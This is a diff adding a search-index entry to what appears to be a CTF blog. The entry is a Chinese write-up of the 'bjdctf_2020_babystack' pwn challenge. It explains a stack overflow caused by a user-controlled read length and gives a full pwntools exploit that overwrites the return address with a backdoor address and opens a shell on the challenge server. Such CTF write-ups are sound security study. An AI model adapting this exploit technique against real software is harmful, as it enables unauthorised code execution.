@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>bjdctf_2020_babystack</title>
+      <link href="/ctf-pwn/9ad083a1.html"/>
+      <url>/ctf-pwn/9ad083a1.html</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>打开于2023年10月7日:point_up_2:</p><p>入门栈溢出</p></blockquote><p>checksec检查附件, 没有开启什么保护.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20231007185500.png" alt="checksec" style="zoom:80%;" /><br>用IDA查看发现有<code>read</code>函数有<code>system</code>函数<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20231007190123.png" alt="漏洞函数" style="zoom:80%;" /><br>在主函数中定义了变量<code>nbytes</code>, 通过<code>scanf</code>来对<code>nbytes</code>赋值, 在<code>read</code>函数中向<code>buf</code>写入的长度由<code>nbytes</code>来决定. 先写入一个大的<code>nbytes</code>值, 然后利用<code>read</code>函数造成溢出, 跳转到<code>backdoor</code>函数.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20231007190402.png" alt="main函数" style="zoom:80%;" /><br>完整exp如下所示:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># sh = process('./bjdctf_2020_babystack')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27358</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4006E6</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'[+]Please input the length of your name:'</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"What's u name?\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PWN </tag>
+            
+            <tag> stackoverflow </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>攻防世界pwn-repeater</title>
       <link href="/ctf-pwn/127a001c.html"/>
       <url>/ctf-pwn/127a001c.html</url>
